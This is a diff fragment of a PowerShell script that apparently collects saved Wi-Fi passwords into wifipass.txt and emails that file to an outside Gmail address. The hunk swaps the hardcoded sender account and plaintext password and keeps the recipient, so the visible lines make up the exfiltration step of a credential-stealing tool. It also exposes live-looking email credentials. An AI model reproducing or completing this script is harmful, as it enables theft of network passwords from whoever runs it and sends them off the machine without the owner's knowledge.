@@ -25,8 +25,8 @@ Out-File wifipass.txt -Append -InputObject $a
 
 # --------Email the output file---------
 # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
-$FROM = "tempmail8697@gmail.com"
-$PASS = "nakss@@8697"
+$FROM = "oceanofanything.jarvis@gmail.com"
+$PASS = "oceanofanything.jarvis.ai.nakss@8697"
 $TO = "funtimesnak@gmail.com"
 
 $PC_NAME = "$env:computername"
